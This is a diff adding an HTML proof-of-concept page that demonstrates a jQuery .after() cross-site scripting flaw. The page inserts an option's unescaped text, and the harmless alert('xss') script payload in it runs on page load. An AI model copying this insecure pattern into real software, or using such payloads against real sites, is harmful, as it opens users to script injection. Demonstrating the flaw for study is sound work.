@@ -1,0 +1,32 @@
+<!-- based on http://watchitlater.com/blog/2011/10/cross-site-scripting-vulnerability-with-javascript-and-jquery/ -->
+<!-- PoC: Just load the page, payload is the value of the option tag. -->
+<html>
+    <head>
+        <title>SoundCloud .after() jQuery XSS Demo</title>
+        <!-- The original example uses jQuery 1.6.4. Also tested positively for 1.11.2. -->
+        <script type="text/javascript" src="jquery-1.6.4.js"></script>
+        
+        <script>
+            alert("Started executing JavaScript");
+            $(function() {
+              alert("jQuery loaded succesfully.");
+              $('#users').each(function() {
+                               var select = $(this);
+                               var option = select.children('option').first();
+                               //after(): Insert content, specified by the parameter, after each element in the set of matched elements.
+                               select.after(option.text()); //.text() returns unescaped contents of option
+                               select.hide();
+                               });
+              });
+            </script>
+    </head>
+    <body>
+        <form method="post">
+            <p>
+            <select id="users" name="users">
+                <option value="bad">&lt;script&gt;alert(&#x27;xss&#x27;);&lt;/script&gt;</option>
+            </select>
+            </p>
+        </form>
+    </body>
+</html>
